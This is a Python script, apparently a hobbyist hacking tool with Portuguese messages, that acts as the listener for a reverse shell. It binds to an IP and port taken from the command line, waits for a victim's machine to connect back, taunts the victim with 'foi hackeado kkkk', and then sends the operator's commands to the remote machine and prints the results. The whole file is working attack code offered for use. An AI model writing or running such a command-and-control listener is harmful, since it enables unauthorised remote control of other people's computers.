#!/usr/bin/env python3
import socket, os, subprocess, sys, platform
from concurrent.futures import ThreadPoolExecutor
from time import sleep
systema = platform.system()
if systema == 'Linux':
    #args e variaveis
    buffer = 4096
    centro = 50
    
    red   = "\033[1;31m"  
    blue  = "\033[1;34m"
    cyan  = "\033[1;36m"
    green = "\033[0;32m"
    reset = "\033[0;0m"
    bold  = "\033[;1m"
    reverse = "\033[;7m"
    branco = "\033[37m"
    gray = "\033[0;37m"
    try:

        if sys.argv[1] == '--help':
            print(gray + """-l [ipv4]
-p [port]
--help = ajuda
example: ./mrhs.py -l 192.168.0.102 -p 9999""", reset)
            sys.exit()
    except:
        sys.exit()
    if sys.argv[1] == '-l':
        host = str(sys.argv[2])
    if sys.argv[3] == '-p':
        port = int(sys.argv[4])
    
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #servidor

    def server():
        print(red + '-'*50, reset)
        print(branco + '*_*'.center(50), reset)
        print('')
        print(red + """
        ███╗   ███╗██████╗    ██╗  ██╗
        ████╗ ████║██╔══██╗   ██║  ██║
        ██╔████╔██║██████╔╝   ███████║
        ██║╚██╔╝██║██╔══██╗   ██╔══██║
        ██║ ╚═╝ ██║██║  ██║██╗██║  ██║
        ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
                              """, reset)
        print(red + '-'*50, reset)
        sleep(1)
        try:
            s.bind((host, port))
            s.listen(40)
            print('', green)
            print(f'listando:'.center(centro - 30), f'{host}:{port}'.ljust(centro))
            client_socket, client_adress = s.accept()
            print(f'{client_adress[0]}:{client_adress[1]}'.rjust(centro - 26), 'conectado'.capitalize(), reset)
            print('', reset)
            print(red + '-'*50, reset)
            mensagem = 'foi hackeado kkkk'.encode()
            client_socket.send(mensagem)
        except:
            print('', green)
            print('Houve um erro no socket tente mudar a porta'.rjust(centro - 3))
            print('', reset)
            print(red + '-'*50, reset)
            s.close()
            sys.exit()
        def send_commands():
            while True:
                cmd = input()
                if cmd == 'exit':
                    print(red + '-'*50, reset)
                    client_socket.close()
                    s.close()
                    sys.exit()
                if len(str.encode(cmd)) > 0:
                    client_socket.send(str.encode(cmd))
                    client_response = str(client_socket.recv(buffer), "utf-8")
                    print(client_response, end="")
        print(green + 'digite os comandos abaixo'.center(centro).title(), reset)
        send_commands()
    
            
    with ThreadPoolExecutor(max_workers=15) as pool:
        pool.map(server)
    
    server()
    s.close()
    

